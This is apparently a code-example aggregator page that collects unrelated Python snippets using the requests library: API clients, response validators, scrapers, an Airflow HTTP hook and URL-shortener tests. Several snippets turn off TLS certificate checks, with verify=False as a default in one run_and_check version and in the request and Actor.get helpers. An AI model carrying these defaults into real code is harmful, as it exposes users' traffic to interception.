            if response.status_code == requests.codes.ok:
                return self._validate_response(response)
            time.sleep(pause)
        raise BLSQueryError() 
**************************************
def fetch(self):
        """Fetches the latest data
        Prepares the query string based on self.params and executes the
        request

        Returns
        -------
        requests.response
            A resonse object
        """
        data = self._prepare_query()
        return self._execute_BLS_query(data) 
**************************************
def check_response(self, response):
        """
        Checks the status code and raise an AirflowException exception on non 2XX or 3XX
        status codes

        :param response: A requests response object
        :type response: requests.response
        """
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError:
            self.log.error("HTTP error: %s", response.reason)
            self.log.error(response.text)
            raise AirflowException(str(response.status_code) + ":" + response.reason) 
**************************************
def run_and_check(self, session, prepped_request, extra_options):
        """
        Grabs extra options like timeout and actually runs the request,
        checking for the result

        :param session: the session to be used to execute the request
        :type session: requests.Session
        :param prepped_request: the prepared request generated in run()
        :type prepped_request: session.prepare_request
        :param extra_options: additional options to be used when executing the request
            i.e. {'check_response': False} to avoid checking raising exceptions on non 2XX
            or 3XX status codes
        :type extra_options: dict
        """
        extra_options = extra_options or {}

        try:
            response = session.send(
                prepped_request,
                stream=extra_options.get("stream", False),
                verify=extra_options.get("verify", True),
                proxies=extra_options.get("proxies", {}),
                cert=extra_options.get("cert"),
                timeout=extra_options.get("timeout"),
                allow_redirects=extra_options.get("allow_redirects", True))

            if extra_options.get('check_response', True):
                self.check_response(response)
            return response

        except requests.exceptions.ConnectionError as ex:
            self.log.warning(str(ex) + ' Tenacity will retry to execute the operation')
            raise ex 
**************************************
def upload_url(self, url):
        """
        Upload remote URL to Capella
        :param url: URL for uploading to Capella
        :return: False if error or response if success (watch doc for self.processRespose)
        """
        try:
            response = requests.post(self.API_URL, {'link': url})
            return self.process_respose(response)

        except Exception as e:
            logging.error("[uploadUrl runtime error]: {}".format(e))
            return False 
**************************************
def process_respose(self, response):
        """
        Process and return a response from Capella API
        :param python requests.response object
        :return: response: dictionary(
            'success' – True or False (mandatory)
            'message' – Description of the result (mandatory)
            'id' – Image ID from Capella API
            'url' – Image URL from Capella API
            'mime' – Mime type of the uploaded image
            'width' – Image's width
            'height' – Image's height
            'color' – Average hex color of the image
            'size' – Image's size in bytes
        )
        """
        if response.status_code != 200:
            logging.error("[uploadUrl] status code {}\nAPI Response: {}".format(response.status_code, response.content))
            return {'success': False, 'message': response.content}
        else:
            api_response = json.loads(response.text)
            if not api_response.get("success"):
                logging.warning("[uploadUrl] API response with error: {}".format(api_response.get("message")))
            else:
                self.url = api_response['url']
                logging.debug("[uploadUrl] API response with success: {}".format(api_response.get("message")))

            return api_response 
**************************************
def _validate_response(response):
        """
        Return response if ok, raise RequestException if not ok
        :param response: requests.response object
        :return: requests.response object
        """
        try:
            response.raise_for_status()
        except requests.RequestException:
            raise RequestException(
                code=response.status_code,
                url=response.url,
                description=response.text)
        else:
            return response 
**************************************
def _make_request(self, method, endpoint, **kwargs):
        """
        Do the actual request with supplied HTTP method
        :param method: HTTP method
        :param endpoint: DHIS2 API endpoint
        :param kwargs: keyword args
        :return: response if ok, RequestException if not
        """
        if isinstance(kwargs.get('file_type'), string_types):
            file_type = kwargs['file_type'].lower()
        else:
            file_type = 'json'
        params = kwargs.get('params')

        data = kwargs.get('data', kwargs.get('json', None))
        url = '{}/{}'.format(self.api_url, endpoint)
        self._validate_request(endpoint, file_type, data, params)

        if method == 'get':
            stream = kwargs.get('stream', False)
            url = '{}.{}'.format(url, file_type)
            r = self.session.get(url, params=params, stream=stream)

        elif method == 'post':
            r = self.session.post(url=url, json=data, params=params)

        elif method == 'put':
            r = self.session.put(url=url, json=data, params=params)

        elif method == 'patch':
            r = self.session.patch(url=url, json=data, params=params)

        elif method == 'delete':
            r = self.session.delete(url=url, params=params)

        else:
            raise ClientException("Non-supported HTTP method: {}".format(method))

        return self._validate_response(r) 
**************************************
def requestlogin(email):  # pragma: no cover
    """Raw Cloud API call, request OTP to be sent to account email address.

    Args:
        email(str): Email address connected to Cozify account.
    """

    payload = {'email': email}
    response = requests.post(cloudBase + 'user/requestlogin', params=payload)
    if response.status_code is not 200:
        raise APIError(response.status_code, response.text) 
**************************************
def lan_ip():  # pragma: no cover
    """1:1 implementation of hub/lan_ip

    This call will fail with an APIError if the requesting source address is not the same as that of the hub, i.e. if they're not in the same NAT network.
    The above is based on observation and may only be partially true.

    Returns:
        list: List of Hub ip addresses.
    """
    response = requests.get(cloudBase + 'hub/lan_ip')
    if response.status_code == 200:
        return json.loads(response.text)
    else:
        raise APIError(response.status_code, response.text) 
**************************************
def hubkeys(cloud_token):  # pragma: no cover
    """1:1 implementation of user/hubkeys

    Args:
        cloud_token(str) Cloud remote authentication token.

    Returns:
        dict: Map of hub_id: hub_token pairs.
    """
    headers = {'Authorization': cloud_token}
    response = requests.get(cloudBase + 'user/hubkeys', headers=headers)
    if response.status_code == 200:
        return json.loads(response.text)
    else:
        raise APIError(response.status_code, response.text) 
**************************************
def refreshsession(cloud_token):  # pragma: no cover
    """1:1 implementation of user/refreshsession

    Args:
        cloud_token(str) Cloud remote authentication token.

    Returns:
        str: New cloud remote authentication token. Not automatically stored into state.
    """
    headers = {'Authorization': cloud_token}
    response = requests.get(cloudBase + 'user/refreshsession', headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        raise APIError(response.status_code, response.text) 
**************************************
def get_region_from_autosuggest(region_part):
    """
    This method makes a request to the OtoDom api, asking for the best fitting region for the supplied
    region_part string.

    :param region_part: input string, it should be a part of an existing region in Poland, either city, street,
                        district or voivodeship
    :rtype: dict
    :return: A dictionary which contents depend on the API response.
    """
    if not region_part:
        return {}
    url = u"https://www.otodom.pl/ajax/geo6/autosuggest/?data={0}".format(
        normalize_text(region_part, lower=False, replace_spaces=''))
    response = json.loads(get_response_for_url(url).text)[0]
    region_type = response["level"]
    text = response["text"].replace("<strong>", "").replace("</strong>", "").split(", ")

    region_dict = {}

    if region_type == "CITY":
        region_dict["city"] = u"{0}{1}{2}".format(normalize_text(text[0]), "_", response["city_id"])
    elif region_type == "DISTRICT":
        region_dict["city"] = u"{0}{1}{2}".format(normalize_text(text[1]), "_", response["city_id"])
        region_dict["[district_id]"] = response["district_id"]
    elif region_type == "REGION":
        region_dict["voivodeship"] = normalize_text(text[0])
    elif region_type == "STREET":
        region_dict["city"] = u"{0}{1}{2}".format(normalize_text(text[0]), "_", response["city_id"])
        region_dict["[street_id]"] = response["street_id"]

    return region_dict 
**************************************
def get_response_for_url(url):
    """
    :param url: an url, most likely from the :meth:`scrape.utils.get_url` method
    :return: a requests.response object
    """
    return requests.get(url, headers={'User-Agent': get_random_user_agent()}) 
**************************************
def get_cookie_from(response):
    """
    :param response: a requests.response object
    :rtype: string
    :return: cookie information as string
    """
    cookie = response.headers['Set-Cookie'].split(';')[0]
    return cookie 
**************************************
def get_csrf_token(html_content):
    """
    :param html_content: a requests.response.content object
    :rtype: string
    :return: the CSRF token as string
    """
    found = re.match(r".*csrfToken\s+=(\\|\s)+'(?P<csrf_token>\w+).*", str(html_content))
    csrf_token = found.groupdict().get('csrf_token')
    return csrf_token 
**************************************
def get_download_symbol_stream(self, lib_filename, debug_id):
        """
        Return a requests.response stream or raise SymbolNotFound
        if the symbol can't be found at all.
        """
        if lib_filename.endswith(".pdb"):
            symbol_filename = lib_filename[:-4] + ".sym"
        else:
            symbol_filename = lib_filename + ".sym"

        stream = self.downloader.get_symbol_stream(
            lib_filename, debug_id, symbol_filename
        )
        return stream 
**************************************
def check_json_response(response):
    """
    A helper function for checking http responses
    :param response: requests.Response
    :return: list or dict
    """
    if response and response.status_code == 200:
        return response.json()
    return [] 
**************************************
def post_request(url, payload, headers):
    """
    A helper function for posting data to evaluators
    :param url: str: entity linker's url
    :param payload: list or dict containing data
    :param headers: dict custom headers to be sent
    :return requests.response
    """

    try:
        response = requests.post(url, data=payload, headers=headers)
        return response
    except requests.exceptions.RequestException as ex:
        logger.warning("Failed to submit data to %s and got a : %s ", url, ex) 
**************************************
def cone_search(ra, dec, radius, table="gaiadr1.gaia_source", **kwargs):
    """
    Perform a cone search against the ESA Gaia database using the TAP.

    :param ra:
        Right ascension (degrees).

    :param dec:
        Declination (degrees).

    :param radius:
        Cone search radius (degrees).

    :param table: [optional]
        The table name to perform the cone search on. Some examples are:

        gaiadr1.gaia_source
        gaiadr1.tgas_source

    :param kwargs:
        Keyword arguments are passed directly to the `query` method.

    :returns:
        The data returned by the ESA/Gaia archive -- either as an astropy
        table or as a dictionary -- and optionally, the `requests.response`
        object used.
    """

    return query(
        """ SELECT * 
        FROM {table} 
        WHERE CONTAINS(
            POINT('ICRS',{table}.ra,{table}.dec),
            CIRCLE('ICRS',{ra:.10f},{dec:.10f},{radius:.10f})) = 1;""".format(
            table=table, ra=ra, dec=dec, radius=radius), **kwargs) 
**************************************
def _get_short_url_from_response(self, response):
        """
        :param response: requests.response object
        :return: str
        """
        # TODO: Fix this
        resp_text = response.text
        idx = resp_text.find(self.url)
        idx_end = resp_text.find('" readonly autofocus id="short_url_blocked"')
        return resp_text[idx:idx_end] 
**************************************
def test_already_shortened_url_error(self):
        err_msg = 'URL is already a pygmy shortened link'
        data = self.data
        data['long_url'] = 'https://pygy.co'
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        self.assertEqual(response.status_code, 400)
        self.assertTrue(err_msg in response.text) 
**************************************
def test_unshorten(self):
        data = self.data
        data['long_url'] = 'https://github.com'
        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        self.assertEqual(response.status_code, 200)
        short_url = self._get_short_url_from_response(response)

        response = requests.get(short_url)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.url, data['long_url'])

    # User access 
**************************************
def test_signup(self):
        data = self.user_data
        data['email'] = '[email protected]'
        response = requests.post(self.url + '/signup', data=data, headers=self.headers)
        self.assertEqual(response.status_code, 200)
        self.assertTrue('Welcome Test' in response.text)
        self.assertIsNotNone(response.cookies.get('access_token'))

        response = requests.post(self.url + '/signup', data=self.user_data, headers=self.headers)
        self.assertEqual(response.status_code, 400)
        self.assertTrue('User exists' in response.text) 
**************************************
def test_invalid_password_login(self):
        response = requests.post(self.url + '/signup', data=self.user_data, headers=self.headers)
        login_data = self.login_data.copy()
        login_data['password'] = 'i know it'
        response = requests.post(self.url + '/login', data=login_data, headers=self.headers)
        self.assertEqual(response.status_code, 400)
        self.assertTrue('LOGIN' in response.text)
        self.assertTrue('Invalid username or password.' in response.text) 
**************************************
def test_login(self):
        response = requests.post(self.url + '/signup', data=self.user_data, headers=self.headers)
        response = requests.get(self.url)
        self.assertTrue('LOGIN' in response.text)
        self.assertTrue('DASHBOARD' not in response.text)

        """Test redirection, hidden login, visible dashboard section, Welcome <username> section
        and dashboard table"""
        response = requests.post(self.url + '/login', data=self.login_data, headers=self.headers)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.url == self.url + '/dashboard')
        self.assertTrue('DASHBOARD' in response.text)
        self.assertTrue('LOGIN' not in response.text)
        self.assertTrue('Welcome Test' in response.text)
        self.assertTrue('<table class="table table-bordered">' in response.text) 
**************************************
def test_logout(self):
        _ = requests.post(self.url + '/signup', data=self.user_data, headers=self.headers)
        with requests.Session() as sess:
            _ = sess.post(self.url + '/login', data=self.login_data, headers=self.headers)
            self.cookies = sess.cookies
            response = sess.get(self.url)
            self.assertEqual(response.status_code, 200)
            self.assertTrue('Welcome Test' in response.text)
            # logout
            response = sess.get(self.url + '/logout', headers=self.headers)
            self.assertEqual(response.url.strip('/'), self.url)
            self.assertEqual(response.status_code, 200)
            self.assertTrue('Welcome Test' not in response.text) 
**************************************
def test_non_loggedin_dashboard(self):
        response = requests.get(self.url + '/dashboard')
        self.assertTrue(response.status_code == 400)
        self.assertTrue('Please log in again to continue.</h3>' in response.text)
    #
    # ###############
    # # Link Options
    # ############### 
**************************************
def test_custom_taken_link_availability(self):
        custom_code = 'logo'
        response = requests.get(self.url + '/check?custom_code={}'.format(custom_code))
        self.assertTrue(response.json().get('ok'))
        data = self.data
        data['custom_url'] = custom_code
        requests.post(self.url + '/shorten', data=data, headers=self.headers)
        response = requests.get(self.url + '/check?custom_code={}'.format(custom_code))
        self.assertFalse(response.json().get('ok')) 
**************************************
def test_custom_taken_link_shorten(self):
        custom_code = 'go'
        response = requests.get(self.url + '/check?custom_code={}'.format(custom_code))
        self.assertTrue(response.json().get('ok'))

        data = self.data
        data['custom_url'] = custom_code
        requests.post(self.url + '/shorten', data=data, headers=self.headers)

        response = requests.get(self.url + '/check?custom_code={}'.format(custom_code))
        self.assertFalse(response.json().get('ok'))

        response = requests.post(self.url + '/shorten', data=data, headers=self.headers)
        self.assertEqual(response.status_code, 400) 
**************************************
def test_logo_svg(self):
        response = requests.get(self.url + '/static/logo/logov2.svg')
        self.assertEqual(response.status_code, 200) 
**************************************
def check_response(self, response):
        """
        Checks the status code and raise an AirflowException exception on non 2XX or 3XX
        status codes
        :param response: A requests response object
        :type response: requests.response
        """
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError:
            self.log.error("HTTP error: %s", response.reason)
            if self.method not in ['GET', 'HEAD']:
                self.log.error(response.text)
            raise AirflowException(str(response.status_code) + ":" + response.reason) 
**************************************
def run_and_check(self, session, prepped_request, extra_options):
        """
        Grabs extra options like timeout and actually runs the request,
        checking for the result
        :param session: the session to be used to execute the request
        :type session: requests.Session
        :param prepped_request: the prepared request generated in run()
        :type prepped_request: session.prepare_request
        :param extra_options: additional options to be used when executing the request
            i.e. {'check_response': False} to avoid checking raising exceptions on non 2XX
            or 3XX status codes
        :type extra_options: dict
        """
        extra_options = extra_options or {}

        try:
            response = session.send(
                prepped_request,
                stream=extra_options.get("stream", False),
                verify=extra_options.get("verify", False),
                proxies=extra_options.get("proxies", {}),
                cert=extra_options.get("cert"),
                timeout=extra_options.get("timeout"),
                allow_redirects=extra_options.get("allow_redirects", True))

            if extra_options.get('check_response', True):
                self.check_response(response)
            return response

        except requests.exceptions.ConnectionError as ex:
            self.log.warn(str(ex) + ' Tenacity will retry to execute the operation')
            raise ex 
**************************************
def requests_link(url: str, encoding: str = "utf-8", method: str = "get", data: Dict = None, headers: Dict = None):
    """
    利用 requests 请求网站, 爬取网站内容, 如网站链接失败, 可重复爬取 20 次
    :param url: string 网站地址
    :param encoding: string 编码类型: "utf-8", "gbk", "gb2312"
    :param method: string 访问方法: "get", "post"
    :param data: dict 上传数据: 键值对
    :param headers: dict 游览器请求头: 键值对
    :return: requests.response 爬取返回内容: response
    """
    i = 0
    while True:
        try:
            if method == "get":
                r = requests.get(url, timeout=10)
                r.encoding = encoding
                return r
            elif method == "post":
                r = requests.post(url, timeout=10, data=data, headers=headers)
                r.encoding = encoding
                return r
            else:
                raise ValueError("请提供正确的请求方式")
        except TimeoutError as e:  # TODO 完善错误类型
            i += 1
            print(f"第{str(i)}次链接失败, 最多尝试 20 次", e)
            time.sleep(5)
            if i > 20:
                return None 
**************************************
def pandas_read_html_link(url: str, encoding: str = "utf-8", method: str = "get", data: Dict = None, headers: Dict = None):
    """
    利用 pandas 提供的 read_html 函数来直接提取网页中的表格内容, 如网站链接失败, 可重复爬取 20 次
    :param url: string 网站地址
    :param encoding: string 编码类型: "utf-8", "gbk", "gb2312"
    :param method: string 访问方法: "get", "post"
    :param data: dict 上传数据: 键值对
    :param headers: dict 游览器请求头: 键值对
    :return: requests.response 爬取返回内容: response
    """
    i = 0
    while True:
        try:
            if method == "get":
                r = requests.get(url, timeout=10)
                r.encoding = encoding
                r = pd.read_html(r.text, encoding=encoding)
                return r
            elif method == "post":
                r = requests.post(url, timeout=10, data=data, headers=headers)
                r.encoding = encoding
                r = pd.read_html(r.text, encoding=encoding)
                return r
            else:
                raise ValueError("请提供正确的请求方式")
        except TimeoutError as e:  # TODO 完善错误类型
            i += 1
            print(f"第{str(i)}次链接失败, 最多尝试20次", e)
            time.sleep(5)
            if i > 20:
                return None 
**************************************
def setResponse(self, status_code, response_headers, keyname='Response'):
        res = dict()
        res['status_code'] = status_code
        for k,v in response_headers.items():
            res[k] = v
        self.query[keyname] = res
        logging.debug('response: {}'.format(self.query['Response'])) 
**************************************
def get(self, url, headers=None, ghost=None, ssl_verify=False):
        '''
        return ActorResponse object
        '''
        req_headers = dict()
        if headers is not None:
            req_headers.update( headers )

        if ghost is not None:
            match = re.search('(http|https):\/\/([^\/]+)(\/.*$|$)', url)
            assert match is not None
            host = match.group(2)
            req_url = url.replace(host, ghost)
            req_headers['host'] = host
            logging.debug('Actor: host={}, req_url={}, req_headers = {}'.format(host, req_url, req_headers))

        else:
            req_url = url

        # throw the http request
        r = self.session.get(req_url, headers=req_headers, verify=ssl_verify, allow_redirects=False)
        logging.debug(req_url)
        logging.debug(req_headers)

        # request/response time profiling in csv
        # FRPROF, url, ghost, time
        logging.debug('FRPROF, {}, {}, {}, {}'.format('LoadTime', url, ghost, r.elapsed.total_seconds()))
        
        return ActorResponse(r) 
**************************************
def __init__(self, response):
        'in: response is requests.Response object'
        #self.r = requests.Response()
        self.r = response 
**************************************
def _throw_request(self, fractreq):
        '''
        input: fract request dict" like {"Ghost":"www.akamai.com","Method":"GET","Url":"https://www.akamai.com/us/en/","Headers":{"Cookie":"abc=123","Accept-Encoding":"gzip"}}
        return: response object of 'requests' lib
        '''
        url = fractreq['Url']
        ghost = fractreq['Ghost']
        headers = fractreq['Headers']
        
        # throw HTTP request
        return self.actor.get( url, headers, ghost ) 
**************************************
def _make_spec_summary(self, fret):
        '''
        export spec summary:
        * request
          - url, ghost, custom header
        * passed
        * testid
        * response
          - status_code, location, ercost
        '''
        request=dict()
        response=dict()
        # request
        t = self._get_testcase( fret.query['TestId'] )
        request['Url']=t.query['Request']['Url']
        request['Method']=t.query['Request']['Method']
        request['Ghost']=t.query['Request']['Ghost']
        hdrs=dict()
        for k,v in t.query['Request']['Headers'].items():
            if k not in ('Pragma', 'X-Akamai-Cloudlet-Cost'):
                hdrs[k]=v
        else:
            request['Headers']=hdrs

        # passed
        passed=fret.query['Passed']

        # testid 
        testid=fret.query['TestId']

        # response
        response['status_code']=fret.query['Response']['status_code']
        response['Server']=fret.query['Response'].setdefault('Server', '')
        response['Location']=fret.query['Response'].setdefault('Location', '')
        response['X-Akamai-Tapioca-Cost-ER']=fret.query['Response'].setdefault('X-Akamai-Tapioca-Cost-ER', '0')

        # append
        return {'Request': request, 'TestPassed': passed, 'Response': response, 'TestId': testid} 
**************************************
def get_paged(self, endpoint, params=None, page_size=50, merge=False):
        """
        GET with paging (for large payloads).
        :param page_size: how many objects per page
        :param endpoint: DHIS2 API endpoint
        :param params: HTTP parameters (dict), defaults to None
        :param merge: If true, return a list containing all pages instead of one page. Defaults to False.
        :return: generator OR a normal DHIS2 response dict, e.g. {"organisationUnits": [...]}
        """
        try:
            if not isinstance(page_size, (string_types, int)) or int(page_size) < 1:
                raise ValueError
        except ValueError:
            raise ClientException("page_size must be > 1")

        params = {} if not params else params
        if 'paging' in params:
            raise ClientException("Can't set paging manually in `params` when using `get_paged`")
        params['pageSize'] = page_size
        params['page'] = 1
        params['totalPages'] = True

        collection = endpoint.split('/')[0]  # only use e.g. events when submitting events/query as endpoint

        def page_generator():
            """Yield pages"""
            page = self.get(endpoint=endpoint, file_type='json', params=params).json()
            page_count = page['pager']['pageCount']
            yield page

            while page['pager']['page'] < page_count:
                params['page'] += 1
                page = self.get(endpoint=endpoint, file_type='json', params=params).json()
                yield page

        if not merge:
            return page_generator()
        else:
            data = []
            for p in page_generator():
                data.append(p[collection])
            return {collection: list(chain.from_iterable(data))} 
**************************************
def query(query, authenticate=False, json=False, full_output=False, **kwargs):
    """
    Execute a synchronous TAP query to the ESA Gaia database.

    :param query:
        The TAP query to execute.

    :param authenticate: [optional]
        Authenticate with the username and password information stored in the
        config.

    :param json: [optional]
        Return the data in JSON format. If set to False, then the data will be
        returned as an `astropy.table.Table`.

    :param full_output: [optional]
        Return a two-length tuple containing the data and the corresponding
        `requests.response` object.

    :returns:
        The data returned - either as an astropy table or a dictionary (JSON) -
        and optionally, the `requests.response` object used.
    """
    
    format = "json" if json else "votable"
    params = dict(REQUEST="doQuery", LANG="ADQL", FORMAT=format, query=query)
    params.update(kwargs)
    
    # Create session.
    session = requests.Session()
    if authenticate:
        utils.login(session)
    response = session.get("{}/tap/sync".format(config.url), params=params)

    if not response.ok:
        raise TAPQueryException(response)

    if json:
        data = response.json()

    else:
        # Take the table contents and return an astropy table.
        data = Table.read(BytesIO(response.text.encode("utf-8")), 
                         format="votable")

    return (data, response) if full_output else data 

Python requests.__build__() Examples

**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 
**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 
**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 
**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 
**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 
**************************************
def init_poolmanager(self, connections, maxsize, block=False):
        if requests.__build__ >= 0x020400:
            # NOTE(Ian): Perhaps we should raise a warning
            self.poolmanager = poolmanager.PoolManager(
                num_pools=connections,
                maxsize=maxsize,
                block=block,
                socket_options=self.socket_options
            )
        else:
            super(SocketOptionsAdapter, self).init_poolmanager(
                connections, maxsize, block
            ) 

Python requests.__dict__() Examples

**************************************
def default(self, obj):
        j = OrderedDict()
        if not inspect.isclass(type(obj)):
            return json.dumps(obj)
        if isinstance(obj, datetime.datetime):
            return obj.replace(tzinfo=tzlocal()).isoformat()
        if isinstance(obj, uuid.UUID):
            return str(obj)

        for key in obj.__dict__.keys():
            if key.startswith("_"):
                continue
            val = obj.__dict__[key]
            if val is None or not val:
                continue
            if type(val) == str:
                try:
                    val = val.decode(errors='ignore').encode('utf-8')
                except AttributeError as e:
                    pass
            j[key] = val
        return j 
**************************************
def _http_request(self, method, url, decode_json=True, *args, **kwargs):

        url = "%s/%s" % (self.api_url, url.lstrip("/"))

        logging.debug("%s %s ..." % (method, url))

        # FIXME: handle retry
        headers = {'Content-Type': 'application/json'} if method == "GET" else {}
        try:
            response = requests.__dict__[method](url, headers=headers, *args, **kwargs)
        except requests.exceptions.ConnectionError as e:
            raise ptRuntimeException(str(e))

        if decode_json or response.status_code != httplib.OK:
            text = response.text.encode(response.encoding if response.encoding else 'utf-8', 'strict')
            text = text.decode('utf-8', 'strict')
            try:
                j = json.loads(text)
                response.json = j
            except ValueError as e:
                raise ptRuntimeException("%s\nresponse:%s" % (str(e), str(text.encode('utf-8'))))

        if response.status_code == httplib.OK:
            if logging.getLogger().getEffectiveLevel() >= logging.DEBUG:
                if decode_json:
                    logging.debug("%s %s ... response:\n%s" % (method, url, ptJsonEncoder.pretty(j)))
                else:
                    logging.debug("%s %s ... response size %d" % (method, url, len(response.content)))
        else:
            logging.error("%s %s status: %s, message: %s" %
                          (method, url, response.status_code, text))

        return response 
**************************************
def request(method, url, headers=None, **kwargs):
    if not hasattr(requests, method):
        raise AttributeError(
            '\'requests\' object has no attribute \'{0}\''.format(method))

    return requests.__dict__[method](url, headers, proxies=PROXY, verify=False, **kwargs) 
**************************************
def __init__(self, url_scheme=DEFAULT_SCHEME):
        self.session = Session()
        requests = self._get_global_requests_module()

        # Methods to replace
        self.methods = ('request', 'get', 'head', 'post',
                        'patch', 'put', 'delete', 'options')
        # Store the original methods
        self.orig_methods = dict(
            (m, requests.__dict__[m]) for m in self.methods)
        # Monkey patch
        g = globals()
        for m in self.methods:
            requests.__dict__[m] = g[m] 
**************************************
def __exit__(self, *args):
        requests = self._get_global_requests_module()
        for m in self.methods:
            requests.__dict__[m] = self.orig_methods[m]


# These are the same methods defined for the global requests object 
**************************************
def _execute(self, verb, params):
    """Send requests to endpoint.

    verb -- the HTTP verb to be used (get, post, delete, ... etc)
    params -- the parameters to be passed in the HTTP request.
    """
    format_args = self.__dict__.pop(
        'format_args') if 'format_args' in self.__dict__ else None
    json_body = self.__dict__.pop(
        'json_body') if 'json_body' in self.__dict__ else None

    for k, v in params.items():
        setattr(self, k, v)

    if json_body:
        body = json.dumps(self.__dict__)
        headers = {'content-type': 'application/json'}
    else:
        body = self.__dict__.copy()
        headers = None

    endpoint = self.Meta.__dict__[verb].format(
        **format_args) if format_args else self.Meta.__dict__[verb]
    self.format_args = None
    self.json_body = None
    self.__dict__ = {}
    self.response = requests.__dict__[verb](endpoint, data=body,
                                            headers=headers)
    return self 
**************************************
def assert_http_verb(self, verb):
        response = requests.__dict__[verb.lower()](self.url)
        self.assert_in_html('HTTP/1.1 {} /'.format(verb), response.content)
        # Response shouldn't be HTML, but if it fails and we get the
        # Django error page, this will make it much more readable. 
**************************************
def assert_http_body(self, verb):
        body = verb + '/body'
        response = requests.__dict__[verb.lower()](self.url, data=body)
        self.assert_in_html('HTTP/1.1 {} /'.format(verb), response.content)
        self.assert_in_html(body, response.content) 
**************************************
def initFromJson(self, json_obj):
        logging.debug("initializing data from json: %s" % str(json_obj))

        def _initFromJson(obj, json_obj):
            for el_name in json_obj:
                if str(el_name) not in obj.__dict__:
                    logging.debug("skipping unrecognized element: %s = %s, while obj is: %s" %
                                  (str(el_name), json_obj[el_name], obj.__dict__))
                    continue

                member = obj.__dict__[el_name]

                if member is None:
                    obj.__dict__[el_name] = json_obj[el_name]
                elif type(member) is list:
                    if len(member):
                        for j in json_obj[el_name]:
                            if hasattr(member[0], 'validate'):
                                new_obj = member[0].__class__(validate=False)
                            else:
                                try:
                                    new_obj = member[0].__class__()
                                except TypeError as e:
                                    logging.error("EXCEPTION: class: %s, error: %s" %
                                                  (member[0].__class__.__name__, str(e)))
                                    raise
                            _initFromJson(new_obj, j)
                            member.append(new_obj)
                    else:
                        obj.__dict__[el_name] = json_obj[el_name]
                elif obj.__dict__[el_name].__class__.__name__.startswith('pt'):
                    # special hack to handle ptServer, ptTest, ptArtifact, ...
                    new_obj = member.__class__()
                    _initFromJson(new_obj, json_obj[el_name])
                elif type(member) is datetime.datetime:
                    obj.__dict__[el_name] = json_obj[el_name]
                elif type(member) is dict:
                    try:
                        obj.__dict__[el_name] = dict(json_obj[el_name])
                    except ValueError as e:
                        obj.__dict__[el_name] = ast.literal_eval(json_obj[el_name])
                else:
                    obj.__dict__[el_name] = type(member)(json_obj[el_name])

        _initFromJson(self, json_obj) 
**************************************
def handleOptions(self, options):
        if not options:
            return

        def _exists(options, key):
            return options.__dict__.get(key, None) is not None

        if _exists(options, 'pt_to_file'):
            self._save_to_file = options.pt_to_file
        if _exists(options, 'pt_url'):
            self.pt_server.setUrl(options.pt_url)
        if _exists(options, 'pt_replace'):
            self.uuid = options.pt_replace
            self.replace = True
        if _exists(options, 'pt_project'):
            self.project_name = options.pt_project
        if _exists(options, 'pt_title'):
            self.job_title = options.pt_title
        if _exists(options, 'pt_version'):
            self.suite_ver = options.pt_version
        if _exists(options, 'pt_regression_tag'):
            self.regression_tag = options.pt_regression_tag
        if _exists(options, 'pt_regression_name'):
            self.regression_name = options.pt_regression_name
        if _exists(options, 'pt_product_name'):
            self.product_name = options.pt_product_name
        if _exists(options, 'pt_product_version'):
            self.product_ver = options.pt_product_version
        if _exists(options, 'pt_append'):
            self.uuid = options.pt_append
            self.append = True
        if _exists(options, 'pt_log_upload'):
            self._stdout_filename = Tee('stdout').filename
            self._stderr_filename = Tee('stderr').filename
            self._stdout_artifact = ptArtifact(self.pt_server, filename="stdout.txt", inline=True,
                                               compression=True, ttl_days=options.pt_log_ttl,
                                               linked_uuids=[self.uuid])
            self._stderr_artifact = ptArtifact(self.pt_server, filename="stderr.txt", inline=True,
                                               compression=True, ttl_days=options.pt_log_ttl,
                                               linked_uuids=[self.uuid])

        self.validateProjectName() 
**************************************
def __new__(mcs, class_name, bases, class_dict):
        """Create a new RestModel class object.

        class_name -- name of class being created.
        bases -- bases of the class being created.
        class_dict -- instance variables.
        """
        for name, value in class_dict.items():
            if isinstance(value, Typed):
                value._name = name

        new_class = type.__new__(mcs, class_name, bases, class_dict)

        if class_name != "RestModel":  # not the base class
            # An inner Meta class must be provided,
            # otherwise the model is meaningless !
            if 'Meta' not in class_dict:
                raise Exception("Meta class must be provided")

            # attach functions and attributes to the RestModel classes.
            setattr(new_class, "format_args", None)
            setattr(new_class, "json_body", None)
            setattr(new_class, "format", _format)
            setattr(new_class, '_execute', _execute)

